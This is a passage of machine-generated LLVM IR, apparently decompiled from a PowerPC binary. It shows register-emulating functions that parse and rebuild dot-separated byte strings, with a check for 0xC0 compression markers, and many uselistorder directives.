dec_label_pc_1000cbac:                            ; preds = %dec_label_pc_1000cb94
  %v3_1000cb9c = icmp eq i8 %v3_1000cb94, 0
  br i1 %v3_1000cb9c, label %dec_label_pc_1000cbcc, label %dec_label_pc_1000cbb0

dec_label_pc_1000cbb0:                            ; preds = %dec_label_pc_1000cbac
  %v2_1000cbb0 = inttoptr i32 %v1_1000cb5c to i8*
  %v3_1000cbb0 = load i8, i8* %v2_1000cbb0, align 1
  %v4_1000cbb0 = zext i8 %v3_1000cbb0 to i32
  %v4_1000cbb4 = icmp eq i32 %v4_1000cbb0, %v0_1000cafc
  br i1 %v4_1000cbb4, label %dec_label_pc_1000cbc0, label %dec_label_pc_1000cbc8

dec_label_pc_1000cbc0:                            ; preds = %dec_label_pc_1000cbb0
  ret i32 %v1_1000cb5c

dec_label_pc_1000cbc8:                            ; preds = %dec_label_pc_1000cbb0
  %v3_1000cbb8 = icmp eq i8 %v3_1000cbb0, 0
  br i1 %v3_1000cbb8, label %dec_label_pc_1000cbcc, label %dec_label_pc_1000cb14

dec_label_pc_1000cbcc:                            ; preds = %dec_label_pc_1000cadc, %dec_label_pc_1000cbc8, %dec_label_pc_1000cb90, %dec_label_pc_1000cb74, %dec_label_pc_1000cbac
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000cb18, { 1, 0 }
  uselistorder i32 %v2_1000cb14, { 0, 2, 1 }
  uselistorder i32 %v0_1000cb6c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v2_1000cb04, { 1, 0 }
  uselistorder i32 %v0_1000cafc, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1000caf0, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1000caf42, { 2, 1, 0 }
  uselistorder i32 %v1_1000cad4, { 1, 2, 0 }
  uselistorder i32 3, { 1, 37, 38, 39, 40, 41, 42, 43, 18, 44, 2, 53, 3, 0, 10, 19, 28, 62, 30, 21, 20, 12, 22, 45, 11, 46, 4, 47, 48, 54, 55, 23, 56, 57, 16, 15, 5, 14, 29, 51, 52, 17, 36, 6, 7, 49, 8, 9, 58, 59, 67, 68, 69, 63, 64, 65, 66, 13, 61, 60, 50, 24, 31, 32, 25, 33, 34, 26, 35, 27 }
  uselistorder i32 -2130640640, { 3, 4, 5, 6, 0, 7, 2, 9, 1, 8 }
  uselistorder i32 65536, { 0, 1, 20, 2, 3, 4, 5, 7, 6, 8, 21, 9, 10, 11, 13, 12, 14, 15, 18, 16, 19, 17 }
  uselistorder i32 4, { 166, 5, 6, 7, 94, 111, 8, 9, 169, 167, 168, 117, 170, 171, 172, 105, 10, 173, 174, 175, 176, 177, 178, 179, 11, 180, 12, 13, 14, 112, 181, 182, 118, 184, 183, 15, 16, 106, 140, 17, 18, 229, 230, 231, 232, 233, 234, 202, 119, 19, 20, 267, 268, 120, 21, 22, 99, 23, 24, 25, 26, 27, 28, 185, 186, 121, 29, 30, 2, 31, 0, 235, 3, 32, 1, 187, 122, 33, 203, 204, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 269, 248, 100, 283, 290, 34, 35, 36, 37, 38, 270, 271, 39, 272, 40, 273, 41, 42, 134, 43, 44, 135, 45, 148, 149, 150, 211, 212, 213, 46, 136, 47, 48, 49, 137, 50, 138, 139, 216, 218, 217, 214, 215, 219, 220, 221, 222, 223, 224, 225, 226, 227, 116, 188, 123, 189, 190, 101, 51, 52, 191, 53, 192, 193, 194, 195, 196, 197, 107, 54, 198, 274, 275, 249, 55, 56, 57, 108, 58, 114, 59, 109, 110, 60, 113, 250, 61, 62, 284, 285, 286, 124, 287, 288, 289, 63, 276, 277, 278, 97, 98, 279, 280, 125, 281, 282, 64, 199, 65, 66, 67, 68, 69, 70, 71, 251, 72, 252, 253, 73, 254, 255, 256, 257, 258, 74, 75, 259, 260, 76, 261, 262, 77, 263, 264, 266, 78, 79, 95, 96, 265, 205, 80, 206, 126, 207, 142, 143, 144, 115, 4, 145, 146, 147, 208, 209, 127, 81, 82, 141, 83, 84, 85, 86, 87, 102, 88, 89, 151, 152, 128, 153, 154, 155, 129, 156, 90, 157, 158, 159, 130, 160, 161, 162, 163, 164, 165, 200, 131, 201, 103, 91, 210, 104, 92, 228, 93, 133, 132 }
  uselistorder i32 256, { 0, 1, 2, 3, 4, 5, 45, 50, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 44, 18, 19, 20, 21, 22, 23, 24, 25, 54, 26, 55, 56, 57, 27, 28, 29, 30, 31, 51, 46, 32, 33, 52, 34, 35, 53, 36, 37, 38, 39, 40, 41, 42, 43, 47, 48, 49 }
  uselistorder label %dec_label_pc_1000cbcc, { 1, 4, 2, 3, 0 }
  uselistorder label %dec_label_pc_1000cb14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000cadc, { 1, 0 }
}

define i32 @function_1000cbd4(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000cbd4:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_1000cbd8 = load i32, i32* @lr, align 4
  store i32 %v0_1000cbd8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v0_1000cbe4 = load i32, i32* @r4, align 4
  store i32 %v0_1000cbe4, i32* @r29, align 4
  %v0_1000cbe8 = load i32, i32* @r5, align 4
  store i32 %v0_1000cbe8, i32* %r27.global-to-local, align 4
  store i32 0, i32* @r28, align 4
  %v3_1000cc5413 = icmp eq i8* %arg1, null
  store i32 %tmp, i32* @r3, align 4
  br i1 %v3_1000cc5413, label %dec_label_pc_1000cc70, label %dec_label_pc_1000cc64

dec_label_pc_1000cbf8:                            ; preds = %dec_label_pc_1000cc64
  store i32 268487676, i32* @lr, align 4
  %v3_1000cbf8 = call i32 @function_1000cad4(i32 %v0_1000cc6414, i32 46)
  store i32 %v3_1000cbf8, i32* @r30, align 4
  %v3_1000cbfc = icmp eq i32 %v3_1000cbf8, 0
  %v0_1000cc00 = load i32, i32* @r31, align 4
  store i32 %v0_1000cc00, i32* @r3, align 4
  %v2_1000cc04 = sub i32 %v3_1000cbf8, %v0_1000cc00
  store i32 %v2_1000cc04, i32* %r0.global-to-local, align 4
  br i1 %v3_1000cbfc, label %dec_label_pc_1000cc0c, label %dec_label_pc_1000cc14

dec_label_pc_1000cc0c:                            ; preds = %dec_label_pc_1000cbf8
  %v0_1000cc0c = call i32 @function_10006ed4()
  store i32 %v0_1000cc0c, i32* %r3.global-to-local, align 4
  %sext = mul i32 %v0_1000cc0c, 16777216
  %v1_1000cc10 = sdiv i32 %sext, 16777216
  store i32 %v1_1000cc10, i32* %r0.global-to-local, align 4
  %v0_1000cc24.pre = load i32, i32* @r31, align 4
  %v0_1000cc34.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000cc14

dec_label_pc_1000cc14:                            ; preds = %dec_label_pc_1000cbf8, %dec_label_pc_1000cc0c
  %v0_1000cc34 = phi i32 [ %v3_1000cbf8, %dec_label_pc_1000cbf8 ], [ %v0_1000cc34.pre, %dec_label_pc_1000cc0c ]
  %v0_1000cc24 = phi i32 [ %v0_1000cc00, %dec_label_pc_1000cbf8 ], [ %v0_1000cc24.pre, %dec_label_pc_1000cc0c ]
  %v0_1000cc40 = phi i32 [ %v2_1000cc04, %dec_label_pc_1000cbf8 ], [ %v1_1000cc10, %dec_label_pc_1000cc0c ]
  %v0_1000cc14 = load i32, i32* @r28, align 4
  %v1_1000cc14 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000cc14 = sub i32 %v1_1000cc14, %v0_1000cc14
  %v1_1000cc1c = add i32 %v0_1000cc14, 1
  store i32 %v1_1000cc1c, i32* %r11.global-to-local, align 4
  %v1_1000cc20 = add i32 %v2_1000cc14, -1
  store i32 %v0_1000cc24, i32* @r4, align 4
  %v0_1000cc28 = load i32, i32* @r29, align 4
  %v2_1000cc28 = add i32 %v0_1000cc28, %v1_1000cc1c
  store i32 %v2_1000cc28, i32* @r3, align 4
  store i32 %v0_1000cc40, i32* @r5, align 4
  %v2_1000cc30 = icmp ult i32 %v0_1000cc40, %v1_1000cc20
  %v1_1000cc34 = add i32 %v0_1000cc34, 1
  store i32 %v1_1000cc34, i32* @r31, align 4
  %v3_1000cc18.not = icmp ne i32 %v0_1000cc40, 0
  %or.cond = and i1 %v2_1000cc30, %v3_1000cc18.not
  br i1 %or.cond, label %dec_label_pc_1000cc40, label %dec_label_pc_1000cc88

dec_label_pc_1000cc40:                            ; preds = %dec_label_pc_1000cc14
  %v3_1000cc40 = trunc i32 %v0_1000cc40 to i8
  %v4_1000cc40 = add i32 %v0_1000cc28, %v0_1000cc14
  %v5_1000cc40 = inttoptr i32 %v4_1000cc40 to i8*
  store i8 %v3_1000cc40, i8* %v5_1000cc40, align 1
  %v0_1000cc44 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000cc44 = load i32, i32* %r0.global-to-local, align 4
  %v2_1000cc44 = add i32 %v1_1000cc44, %v0_1000cc44
  store i32 %v2_1000cc44, i32* @r28, align 4
  store i32 268487756, i32* @lr, align 4
  %v0_1000cc48 = call i32 @function_10006d88()
  store i32 %v0_1000cc48, i32* %r3.global-to-local, align 4
  %v0_1000cc4c = load i32, i32* @r30, align 4
  %v3_1000cc4c = icmp eq i32 %v0_1000cc4c, 0
  br i1 %v3_1000cc4c, label %dec_label_pc_1000cc70, label %dec_label_pc_1000cc40.dec_label_pc_1000cc54_crit_edge

dec_label_pc_1000cc40.dec_label_pc_1000cc54_crit_edge: ; preds = %dec_label_pc_1000cc40
  %v0_1000cc54.pre = load i32, i32* @r31, align 4
  %v3_1000cc54 = icmp eq i32 %v0_1000cc54.pre, 0
  store i32 %v0_1000cc54.pre, i32* @r3, align 4
  br i1 %v3_1000cc54, label %dec_label_pc_1000cc70, label %dec_label_pc_1000cc64

dec_label_pc_1000cc64:                            ; preds = %dec_label_pc_1000cbd4, %dec_label_pc_1000cc40.dec_label_pc_1000cc54_crit_edge
  %v0_1000cc6414 = phi i32 [ %v0_1000cc54.pre, %dec_label_pc_1000cc40.dec_label_pc_1000cc54_crit_edge ], [ %tmp, %dec_label_pc_1000cbd4 ]
  %v1_1000cc64 = inttoptr i32 %v0_1000cc6414 to i8*
  %v2_1000cc64 = load i8, i8* %v1_1000cc64, align 1
  %v3_1000cc64 = zext i8 %v2_1000cc64 to i32
  store i32 %v3_1000cc64, i32* %r0.global-to-local, align 4
  %v3_1000cc68 = icmp eq i8 %v2_1000cc64, 0
  br i1 %v3_1000cc68, label %dec_label_pc_1000cc70, label %dec_label_pc_1000cbf8

dec_label_pc_1000cc70:                            ; preds = %dec_label_pc_1000cc40.dec_label_pc_1000cc54_crit_edge, %dec_label_pc_1000cc40, %dec_label_pc_1000cc64, %dec_label_pc_1000cbd4
  %v0_1000cc70 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_1000cc70, 1
  br i1 %tmp10, label %dec_label_pc_1000cc88, label %dec_label_pc_1000cc78

dec_label_pc_1000cc78:                            ; preds = %dec_label_pc_1000cc70
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1000cc7c = load i32, i32* @r28, align 4
  %v1_1000cc7c = add i32 %v0_1000cc7c, 1
  store i32 %v1_1000cc7c, i32* %r3.global-to-local, align 4
  %v1_1000cc80 = load i32, i32* @r29, align 4
  %v4_1000cc80 = add i32 %v1_1000cc80, %v0_1000cc7c
  %v5_1000cc80 = inttoptr i32 %v4_1000cc80 to i8*
  store i8 0, i8* %v5_1000cc80, align 1
  %v0_1000cc9c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cc8c

dec_label_pc_1000cc88:                            ; preds = %dec_label_pc_1000cc14, %dec_label_pc_1000cc70
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000cc8c

dec_label_pc_1000cc8c:                            ; preds = %dec_label_pc_1000cc78, %dec_label_pc_1000cc88
  %v0_1000cc9c = phi i32 [ %v0_1000cc9c.pre, %dec_label_pc_1000cc78 ], [ -1, %dec_label_pc_1000cc88 ]
  store i32 %v0_1000cbd8, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000cc9c

; uselistorder directives
  uselistorder i32 %v0_1000cc6414, { 1, 0 }
  uselistorder i32 %v0_1000cc54.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1000cc40, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1000cc10, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 1, 2, 4, 5, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @function_10006ed4, { 12, 40, 39, 20, 21, 13, 11, 9, 19, 18, 1, 38, 2, 37, 36, 35, 3, 34, 7, 6, 33, 32, 31, 5, 4, 30, 29, 28, 27, 8, 26, 25, 24, 23, 22, 17, 0, 16, 14, 15, 10 }
  uselistorder i32 (i32, i32)* @function_1000cad4, { 0, 2, 1 }
  uselistorder i32 46, { 1, 4, 2, 5, 0, 6, 3 }
  uselistorder label %dec_label_pc_1000cc8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc88, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc70, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000cc64, { 1, 0 }
  uselistorder label %dec_label_pc_1000cc14, { 1, 0 }
}

define i32 @function_1000cca0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000cca0:
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_1000cca4 = call i32 @__asm_mfcr()
  store i32 %v0_1000cca4, i32* @r26, align 4
  %v3_1000ccb0 = icmp eq i32 %v0_1000cca4, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_1000ccc0 = load i32, i32* @r6, align 4
  store i32 %v0_1000ccc0, i32* @r24, align 4
  br i1 %v3_1000ccb0, label %dec_label_pc_1000cd78, label %dec_label_pc_1000ccc8

dec_label_pc_1000ccc8:                            ; preds = %dec_label_pc_1000cca0
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000cd5414 = load i32, i32* @r4, align 4
  %v2_1000cd5415 = add i32 %v1_1000cd5414, %v0_1000cca4
  %v3_1000cd5416 = inttoptr i32 %v2_1000cd5415 to i8*
  %v4_1000cd5417 = load i8, i8* %v3_1000cd5416, align 1
  %v5_1000cd5418 = zext i8 %v4_1000cd5417 to i32
  store i32 %v5_1000cd5418, i32* @r31, align 4
  store i1 false, i1* @cr4_eq, align 1
  %v3_1000cd5c20 = icmp eq i8 %v4_1000cd5417, 0
  br i1 %v3_1000cd5c20, label %dec_label_pc_1000cd68, label %dec_label_pc_1000ccd8

dec_label_pc_1000ccd8:                            ; preds = %dec_label_pc_1000ccc8, %dec_label_pc_1000cd50
  %v3_1000cd5822 = phi i1 [ %v3_1000cd58, %dec_label_pc_1000cd50 ], [ false, %dec_label_pc_1000ccc8 ]
  %v5_1000cd5421 = phi i32 [ %v5_1000cd54, %dec_label_pc_1000cd50 ], [ %v5_1000cd5418, %dec_label_pc_1000ccc8 ]
  br i1 %v3_1000cd5822, label %dec_label_pc_1000cce0, label %dec_label_pc_1000ccdc

dec_label_pc_1000ccdc:                            ; preds = %dec_label_pc_1000ccd8
  %v0_1000ccdc = load i32, i32* %r27.global-to-local, align 4
  %v1_1000ccdc = add i32 %v0_1000ccdc, 1
  store i32 %v1_1000ccdc, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000cce0

dec_label_pc_1000cce0:                            ; preds = %dec_label_pc_1000ccd8, %dec_label_pc_1000ccdc
  %v1_1000cce0 = call i32 @__asm_rlwinm(i32 %v5_1000cd5421, i32 0, i32 24, i32 25)
  %v0_1000cce4 = load i32, i32* @r4, align 4
  %v1_1000cce4 = add i32 %v0_1000cce4, 1
  store i32 %v1_1000cce4, i32* @r30, align 4
  %v3_1000cce8 = icmp eq i32 %v1_1000cce0, 192
  br i1 %v3_1000cce8, label %dec_label_pc_1000ccf0, label %dec_label_pc_1000cd10

dec_label_pc_1000ccf0:                            ; preds = %dec_label_pc_1000cce0
  %v0_1000ccf0 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_1000ccf0, label %dec_label_pc_1000ccf8, label %dec_label_pc_1000ccf4

dec_label_pc_1000ccf4:                            ; preds = %dec_label_pc_1000ccf0
  %v0_1000ccf4 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000ccf4 = add i32 %v0_1000ccf4, 1
  store i32 %v1_1000ccf4, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000ccf8

dec_label_pc_1000ccf8:                            ; preds = %dec_label_pc_1000ccf0, %dec_label_pc_1000ccf4
  %v0_1000ccf8 = load i32, i32* @r26, align 4
  %v2_1000ccf8 = add i32 %v0_1000ccf8, %v1_1000cce4
  %v3_1000ccf8 = inttoptr i32 %v2_1000ccf8 to i8*
  %v4_1000ccf8 = load i8, i8* %v3_1000ccf8, align 1
  %v5_1000ccf8 = zext i8 %v4_1000ccf8 to i32
  %v1_1000ccfc = call i32 @__asm_rlwinm(i32 %v5_1000cd5421, i32 8, i32 18, i32 23)
  %v0_1000cd00 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1000cd00, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_1000cd08 = or i32 %v5_1000ccf8, %v1_1000ccfc
  store i32 %v2_1000cd08, i32* @r4, align 4
  br label %dec_label_pc_1000cd50

dec_label_pc_1000cd10:                            ; preds = %dec_label_pc_1000cce0
  %v0_1000cd10 = load i32, i32* %r11.global-to-local, align 4
  %v2_1000cd10 = add i32 %v0_1000cd10, %v5_1000cd5421
  store i32 %v2_1000cd10, i32* @r29, align 4
  %v1_1000cd14 = add i32 %v2_1000cd10, 1
  store i32 %v1_1000cd14, i32* @r28, align 4
  %v1_1000cd18 = load i32, i32* @r24, align 4
  %v2_1000cd18 = icmp ult i32 %v1_1000cd14, %v1_1000cd18
  br i1 %v2_1000cd18, label %dec_label_pc_1000cd20, label %dec_label_pc_1000cd78

dec_label_pc_1000cd20:                            ; preds = %dec_label_pc_1000cd10
  %v0_1000cd20 = load i32, i32* @r26, align 4
  %v2_1000cd20 = add i32 %v0_1000cd20, %v1_1000cce4
  store i32 %v2_1000cd20, i32* @r4, align 4
  %v0_1000cd24 = load i32, i32* @r25, align 4
  %v2_1000cd24 = add i32 %v0_1000cd24, %v0_1000cd10
  store i32 %v2_1000cd24, i32* @r3, align 4
  store i32 %v5_1000cd5421, i32* @r5, align 4
  store i32 268487984, i32* @lr, align 4
  %v0_1000cd2c = call i32 @function_10006d88()
  %v0_1000cd30 = load i32, i32* @r30, align 4
  %v2_1000cd30 = add i32 %v0_1000cd30, %v5_1000cd5421
  store i32 %v2_1000cd30, i32* @r4, align 4
  %v0_1000cd34 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_1000cd34, label %dec_label_pc_1000cd3c, label %dec_label_pc_1000cd38

dec_label_pc_1000cd38:                            ; preds = %dec_label_pc_1000cd20
  %v0_1000cd38 = load i32, i32* %r27.global-to-local, align 4
  %v2_1000cd38 = add i32 %v0_1000cd38, %v5_1000cd5421
  store i32 %v2_1000cd38, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000cd3c

dec_label_pc_1000cd3c:                            ; preds = %dec_label_pc_1000cd20, %dec_label_pc_1000cd38
  %v0_1000cd3c = load i32, i32* @r26, align 4
  %v2_1000cd3c = add i32 %v0_1000cd3c, %v2_1000cd30
  %v3_1000cd3c = inttoptr i32 %v2_1000cd3c to i8*
  %v4_1000cd3c = load i8, i8* %v3_1000cd3c, align 1
  %v3_1000cd40 = icmp eq i8 %v4_1000cd3c, 0
  br i1 %v3_1000cd40, label %dec_label_pc_1000cd4c, label %dec_label_pc_1000cd48

dec_label_pc_1000cd48:                            ; preds = %dec_label_pc_1000cd3c
  br label %dec_label_pc_1000cd4c

dec_label_pc_1000cd4c:                            ; preds = %dec_label_pc_1000cd3c, %dec_label_pc_1000cd48
  %v0_1000cd4c.off0 = phi i8 [ 0, %dec_label_pc_1000cd3c ], [ 46, %dec_label_pc_1000cd48 ]
  %v1_1000cd4c = load i32, i32* @r25, align 4
  %v2_1000cd4c = load i32, i32* @r29, align 4
  %v4_1000cd4c = add i32 %v2_1000cd4c, %v1_1000cd4c
  %v5_1000cd4c = inttoptr i32 %v4_1000cd4c to i8*
  store i8 %v0_1000cd4c.off0, i8* %v5_1000cd4c, align 1
  %v0_1000cd50.pre = load i32, i32* @r28, align 4
  %v0_1000cd58.pre.pre = load i32, i32* @r23, align 4
  %v1_1000cd54.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000cd50

dec_label_pc_1000cd50:                            ; preds = %dec_label_pc_1000ccf8, %dec_label_pc_1000cd4c
  %v1_1000cd54 = phi i32 [ %v2_1000cd08, %dec_label_pc_1000ccf8 ], [ %v1_1000cd54.pre, %dec_label_pc_1000cd4c ]
  %v0_1000cd58.pre = phi i32 [ 0, %dec_label_pc_1000ccf8 ], [ %v0_1000cd58.pre.pre, %dec_label_pc_1000cd4c ]
  %v0_1000cd50 = phi i32 [ %v0_1000cd00, %dec_label_pc_1000ccf8 ], [ %v0_1000cd50.pre, %dec_label_pc_1000cd4c ]
  %v0_1000cd54.pre = load i32, i32* @r26, align 4
  store i32 %v0_1000cd50, i32* %r11.global-to-local, align 4
  %v2_1000cd54 = add i32 %v1_1000cd54, %v0_1000cd54.pre
  %v3_1000cd54 = inttoptr i32 %v2_1000cd54 to i8*
  %v4_1000cd54 = load i8, i8* %v3_1000cd54, align 1
  %v5_1000cd54 = zext i8 %v4_1000cd54 to i32
  store i32 %v5_1000cd54, i32* @r31, align 4
  %v3_1000cd58 = icmp eq i32 %v0_1000cd58.pre, 0
  store i1 %v3_1000cd58, i1* @cr4_eq, align 1
  %v3_1000cd5c = icmp eq i8 %v4_1000cd54, 0
  br i1 %v3_1000cd5c, label %dec_label_pc_1000cd64, label %dec_label_pc_1000ccd8

dec_label_pc_1000cd64:                            ; preds = %dec_label_pc_1000cd50
  %v0_1000cd6c.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_1000cd58, label %dec_label_pc_1000cd78, label %dec_label_pc_1000cd68

dec_label_pc_1000cd68:                            ; preds = %dec_label_pc_1000ccc8, %dec_label_pc_1000cd64
  %v0_1000cd6c.pre26 = phi i32 [ %v0_1000cd6c.pre.pre, %dec_label_pc_1000cd64 ], [ 0, %dec_label_pc_1000ccc8 ]
  %v1_1000cd68 = add i32 %v0_1000cd6c.pre26, 1
  store i32 %v1_1000cd68, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_1000cd78

dec_label_pc_1000cd78:                            ; preds = %dec_label_pc_1000cd10, %dec_label_pc_1000cd64, %dec_label_pc_1000cd68, %dec_label_pc_1000cca0
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1000cca0 ], [ %v1_1000cd68, %dec_label_pc_1000cd68 ], [ %v0_1000cd6c.pre.pre, %dec_label_pc_1000cd64 ], [ -1, %dec_label_pc_1000cd10 ]
  %v1_1000cd8c = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000cca4)
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_1000cd6c.pre.pre, { 1, 0 }
  uselistorder i1 %v3_1000cd58, { 0, 2, 1 }
  uselistorder i32 %v5_1000cd54, { 1, 0 }
  uselistorder i32 %v5_1000cd5421, { 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_1000cca4, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 2, 3, 4, 0, 1 }
  uselistorder i32 ()* @function_10006d88, { 7, 6, 19, 18, 4, 3, 16, 15, 2, 23, 11, 10, 0, 14, 1, 17, 9, 8, 5, 22, 21, 20, 13, 12 }
  uselistorder i32* @r5, { 19, 20, 21, 3, 22, 23, 37, 62, 63, 25, 26, 7, 4, 27, 1, 28, 38, 39, 40, 41, 42, 43, 64, 11, 44, 45, 46, 47, 48, 49, 6, 65, 66, 77, 29, 30, 69, 70, 71, 8, 24, 50, 51, 52, 78, 79, 80, 81, 72, 73, 2, 74, 75, 76, 31, 53, 54, 55, 0, 56, 57, 58, 67, 68, 33, 34, 59, 60, 12, 61, 35, 5, 9, 10, 13, 14, 15, 16, 17, 18, 32, 36 }
  uselistorder i32* @r29, { 23, 24, 25, 26, 27, 123, 124, 1, 28, 12, 29, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 16, 17, 18, 19, 20, 2, 40, 41, 42, 43, 44, 45, 46, 47, 58, 59, 60, 92, 125, 126, 48, 49, 50, 53, 54, 127, 128, 94, 95, 96, 93, 97, 14, 98, 99, 3, 100, 101, 102, 103, 104, 105, 129, 130, 131, 132, 133, 79, 80, 81, 82, 83, 84, 4, 85, 86, 87, 88, 89, 90, 91, 55, 56, 57, 5, 134, 135, 136, 51, 52, 106, 107, 6, 108, 109, 110, 111, 61, 62, 13, 63, 64, 65, 66, 67, 68, 15, 7, 0, 69, 112, 113, 114, 115, 116, 117, 118, 121, 8, 11, 9, 122, 21, 119, 120, 137, 138, 139, 140, 70, 71, 72, 73, 74, 10, 75, 22, 76, 77, 78 }
  uselistorder i32* @r28, { 2, 22, 23, 24, 25, 26, 27, 32, 33, 28, 29, 30, 31, 34, 35, 36, 37, 38, 39, 40, 41, 42, 12, 3, 11, 13, 14, 15, 16, 17, 18, 43, 47, 44, 45, 46, 1, 82, 83, 50, 51, 117, 118, 84, 4, 85, 86, 87, 88, 89, 5, 119, 120, 121, 122, 129, 77, 78, 79, 80, 81, 52, 53, 123, 124, 125, 126, 127, 48, 49, 90, 91, 54, 6, 55, 56, 57, 58, 59, 60, 61, 62, 92, 93, 94, 7, 95, 96, 8, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 0, 113, 114, 19, 20, 21, 128, 63, 64, 65, 66, 9, 67, 10, 68, 69, 70, 71, 72, 73, 74, 115, 116, 75, 76 }
  uselistorder i32 23, { 0, 4, 5, 6, 1, 2, 3 }
  uselistorder i32 18, { 1, 0, 2, 3, 4 }
  uselistorder i32 8, { 48, 49, 50, 51, 52, 53, 21, 22, 54, 55, 56, 57, 58, 59, 25, 26, 23, 15, 18, 19, 27, 28, 29, 30, 31, 60, 67, 68, 69, 20, 90, 61, 0, 70, 91, 92, 93, 94, 95, 96, 97, 98, 12, 99, 100, 101, 123, 124, 131, 134, 11, 37, 38, 13, 32, 14, 39, 79, 33, 83, 82, 80, 81, 84, 85, 86, 87, 88, 89, 1, 62, 63, 64, 24, 45, 46, 16, 47, 128, 129, 130, 2, 135, 3, 132, 133, 65, 71, 72, 73, 34, 102, 103, 104, 105, 106, 17, 107, 108, 109, 110, 4, 5, 111, 112, 6, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 10, 7, 125, 126, 127, 74, 75, 76, 77, 35, 36, 78, 8, 9, 40, 41, 42, 43, 44, 66 }
  uselistorder i32* @r30, { 32, 33, 34, 8, 35, 37, 39, 40, 41, 42, 43, 36, 38, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 20, 21, 22, 1, 23, 24, 25, 7, 26, 27, 58, 55, 56, 5, 57, 4, 103, 104, 105, 9, 106, 107, 108, 59, 60, 61, 62, 63, 64, 65, 18, 66, 67, 68, 69, 70, 71, 72, 73, 109, 110, 111, 112, 113, 10, 114, 115, 116, 117, 118, 11, 142, 143, 144, 145, 12, 96, 146, 157, 147, 148, 28, 0, 29, 13, 30, 31, 97, 98, 99, 100, 101, 102, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 149, 150, 151, 152, 153, 154, 155, 14, 156, 119, 120, 84, 15, 85, 86, 89, 87, 88, 90, 91, 93, 92, 6, 94, 121, 122, 123, 124, 125, 2, 127, 19, 128, 16, 129, 130, 126, 131, 132, 133, 134, 135, 136, 137, 17, 138, 139, 3, 140, 141, 95 }
  uselistorder i1* @cr4_eq, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i1 false, { 1, 2, 4, 5, 6, 7, 8, 9, 0, 3, 10, 11, 12 }
  uselistorder i32* @r31, { 77, 2, 7, 78, 6, 79, 80, 81, 8, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 48, 51, 9, 42, 10, 11, 52, 53, 54, 96, 97, 98, 99, 1, 100, 101, 102, 103, 104, 105, 106, 107, 216, 217, 218, 219, 220, 138, 12, 139, 140, 141, 142, 13, 143, 144, 145, 146, 147, 148, 221, 222, 223, 224, 225, 226, 227, 228, 229, 14, 230, 15, 272, 273, 274, 16, 109, 108, 3, 111, 112, 113, 114, 115, 116, 117, 118, 62, 63, 64, 65, 149, 17, 150, 151, 18, 152, 153, 19, 154, 155, 231, 232, 233, 234, 235, 20, 236, 237, 238, 239, 21, 240, 22, 241, 242, 243, 47, 244, 0, 275, 276, 277, 23, 49, 278, 43, 203, 24, 204, 284, 285, 45, 72, 279, 282, 283, 75, 76, 55, 56, 57, 58, 59, 73, 74, 4, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 119, 120, 121, 26, 